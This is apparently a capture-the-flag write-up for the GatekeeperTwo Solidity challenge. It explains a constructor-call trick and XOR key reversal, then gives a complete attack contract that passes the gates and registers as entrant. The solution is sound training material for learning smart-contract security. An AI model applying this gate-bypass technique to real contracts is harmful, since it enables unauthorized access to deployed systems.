## Objectives

1. Get past the three `require` function and register as an entrant.

## Vulnerabilities

N/A, It's a technical skill test.

## Exploit

1. The first two `require` conditions are seemingly **mutualy exclusive**. Therefore a little imagination is required here.
   Calling the `enter` function from a `constructor` will result in successfully passing the second require condition.

2. Finding the value of the bytes8 key can seem daunting. That being said, the `^` operator or <InlineMath>\oplus </InlineMath> in math is **reversible**.
   This means that <InlineMath> a \oplus b = c \Leftrightarrow a \oplus c = b</InlineMath>.

3. With those two ideas in mind, write and deploy the following contract to make yourself the `entrant` :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoHack {
    constructor(address _targetAddress){
        GatekeeperTwo target = GatekeeperTwo(_targetAddress);
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        target.enter(key);
    }
}
```

## Suggested mitigation

N/A, It's a technical skill test.
